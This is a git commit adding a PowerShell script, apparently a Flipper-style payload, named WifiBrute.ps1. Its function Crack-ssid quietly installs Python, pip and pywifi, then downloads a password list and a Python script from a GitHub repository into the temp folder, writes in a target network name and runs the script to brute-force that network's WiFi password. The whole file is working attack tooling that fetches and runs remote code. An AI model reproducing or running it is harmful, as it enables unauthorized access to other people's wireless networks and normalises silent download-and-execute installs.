d3b723dcdff1bddf18ec43c302fb2f6f4ddc44ed
CaliNux <132522491+calinux-py@users.noreply.github.com>
2023-08-05 13:46:48 -0700

    Add files via upload

---
+++ WiFi Brute Force (Python)/WifiBrute.ps1
@@ -0,0 +1,60 @@
+function Crack-ssid {
+    param (
+        [string]$ssid
+    )
+
+    # Check if Python is installed
+    $pythonInstalled = Get-Command python -ErrorAction SilentlyContinue
+    if (-not $pythonInstalled) {
+        # Download and install Python
+        $pythonInstallerUrl = 'https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe'
+        $pythonInstallerPath = "$env:TEMP\python-installer.exe"
+        Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath -UseBasicParsing
+        Start-Process -FilePath $pythonInstallerPath -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
+        Remove-Item -Path $pythonInstallerPath -Force
+    }
+
+    # Check if pip is installed
+    $pipInstalled = Get-Command pip -ErrorAction SilentlyContinue
+    if (-not $pipInstalled) {
+        # Download and install pip
+        $getPipUrl = 'https://bootstrap.pypa.io/get-pip.py'
+        $getPipPath = "$env:TEMP\get-pip.py"
+        Invoke-WebRequest -Uri $getPipUrl -OutFile $getPipPath -UseBasicParsing
+        python $getPipPath
+        Remove-Item -Path $getPipPath -Force
+    }
+
+    # Check if comtypes is installed
+    $comtypesInstalled = Get-Command python -ErrorAction SilentlyContinue | ForEach-Object { $_.ModuleName } | Where-Object { $_ -eq 'comtypes' }
+    if (-not $comtypesInstalled) {
+        # Install comtypes
+        pip3 install comtypes
+    }
+
+    # Install pywifi
+    pip3 install pywifi
+
+	# Just in case lolol
+    pip install pywifi
+
+    # Download pass.txt from the URL and save it to the user's temp directory
+    $passUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt'
+    $passFilePath = "$env:TEMP\pass.txt"
+    Invoke-WebRequest -Uri $passUrl -OutFile $passFilePath -UseBasicParsing
+
+    # Download flipper.py from the URL and save it to the user's temp directory
+    $flipperUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py'
+    $flipperFilePath = "$env:TEMP\flipper.py"
+    Invoke-WebRequest -Uri $flipperUrl -OutFile $flipperFilePath -UseBasicParsing
+
+    # Replace "YOUR_SSID_HERE" with the provided SSID
+    (Get-Content $flipperFilePath) -replace 'YOUR_SSID_HERE', $ssid | Set-Content $flipperFilePath
+
+    # Run the Python script with the updated SSID
+    python $flipperFilePath
+}
+
+
+# Crack-ssid -ssid "YOUR_SSID_HERE"
+
